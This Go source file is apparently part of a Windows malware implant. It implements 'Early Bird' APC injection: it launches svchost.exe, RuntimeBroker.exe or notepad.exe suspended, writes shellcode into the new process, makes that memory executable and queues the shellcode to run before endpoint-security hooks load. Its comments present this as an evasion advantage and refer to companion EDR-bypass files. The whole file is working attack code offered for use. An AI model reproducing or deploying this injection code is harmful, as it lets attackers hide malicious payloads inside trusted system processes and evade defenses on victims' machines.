//go:build windows

package implant

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	// New procs not declared elsewhere in the package.
	// pCreateProcessW, pWriteProcessMemory, pResumeThread, pVirtualProtectEx
	// are already declared in edr_bypass_windows.go / evasion_windows.go.
	// procVirtualAllocEx is already declared in memexec_windows.go.
	pQueueUserAPC = modKernel32.NewProc("QueueUserAPC")
)

const (
	CREATE_SUSPENDED   = 0x00000004
	PAGE_EXECUTE_READ  = 0x20
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

// ebStartupInfo is a local STARTUPINFOW layout used by Early Bird injection.
// Named distinctly to avoid conflicts with any other startupInfo types in the package.
type ebStartupInfo struct {
	Cb              uint32
	_               *uint16
	Desktop         *uint16
	Title           *uint16
	X, Y            uint32
	XSize, YSize    uint32
	XCountChars     uint32
	YCountChars     uint32
	FillAttribute   uint32
	Flags           uint32
	ShowWindow      uint16
	_               uint16
	_               *byte
	StdInput        syscall.Handle
	StdOutput       syscall.Handle
	StdErr          syscall.Handle
}

// ebProcessInformation mirrors PROCESS_INFORMATION for Early Bird injection.
type ebProcessInformation struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessID uint32
	ThreadID  uint32
}

// EarlyBirdInject injects shellcode into a newly-created suspended process
// using the Early Bird APC technique. The process is created suspended,
// shellcode is written to its memory, an APC is queued to the main thread
// pointing at the shellcode, then the thread is resumed.
//
// The key OPSEC advantage: APC executes before DLL TLS callbacks and
// before EDR hooks in loaded DLLs have a chance to initialize.
//
// targetProcess: path to the host process (e.g., "C:\\Windows\\System32\\svchost.exe")
func EarlyBirdInject(targetProcess string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	var si ebStartupInfo
	var pi ebProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// Create the target process in suspended state
	procPath, err := syscall.UTF16PtrFromString(targetProcess)
	if err != nil {
		return fmt.Errorf("UTF16 conversion: %w", err)
	}

	// pCreateProcessW is declared in edr_bypass_windows.go (modKernel32)
	ret, _, errCode := pCreateProcessW.Call(
		uintptr(unsafe.Pointer(procPath)), // lpApplicationName
		0,                                 // lpCommandLine
		0,                                 // lpProcessAttributes
		0,                                 // lpThreadAttributes
		0,                                 // bInheritHandles
		CREATE_SUSPENDED,                  // dwCreationFlags — key flag
		0,                                 // lpEnvironment
		0,                                 // lpCurrentDirectory
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %v", errCode)
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	// Allocate RW memory in the remote process for shellcode.
	// procVirtualAllocEx is declared in memexec_windows.go (kernel32).
	remoteAddr, _, errCode := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, // constants from bof_windows.go
		PAGE_READWRITE,         // constant from bof_windows.go
	)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", errCode)
	}

	// Write shellcode into the remote process.
	// pWriteProcessMemory is declared in evasion_windows.go (modKernel32).
	var written uintptr
	ret, _, errCode = pWriteProcessMemory.Call(
		uintptr(pi.Process),
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", errCode)
	}

	// Flip memory protection to RX (no write).
	// pVirtualProtectEx is declared in edr_bypass_windows.go (modKernel32).
	var oldProtect uint32
	pVirtualProtectEx.Call(
		uintptr(pi.Process),
		remoteAddr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Queue an APC to the main thread pointing at the shellcode.
	// When the thread is resumed it executes the APC before anything else.
	ret, _, errCode = pQueueUserAPC.Call(
		remoteAddr,         // pfnAPC — our shellcode address
		uintptr(pi.Thread), // hThread — main thread of new process
		0,                  // dwData
	)
	if ret == 0 {
		return fmt.Errorf("QueueUserAPC failed: %v", errCode)
	}

	// Resume the thread — shellcode APC executes first.
	// pResumeThread is declared in evasion_windows.go (modKernel32).
	pResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// InjectShellcodeEarlyBird is the public wrapper that picks a suitable
// host process and calls EarlyBirdInject.
func InjectShellcodeEarlyBird(shellcode []byte) error {
	candidates := []string{
		`C:\Windows\System32\RuntimeBroker.exe`,
		`C:\Windows\System32\svchost.exe`,
		`C:\Windows\SysWOW64\notepad.exe`,
		`C:\Windows\System32\notepad.exe`,
	}
	for _, candidate := range candidates {
		if err := EarlyBirdInject(candidate, shellcode); err == nil {
			return nil
		}
	}
	return fmt.Errorf("all Early Bird injection candidates failed")
}
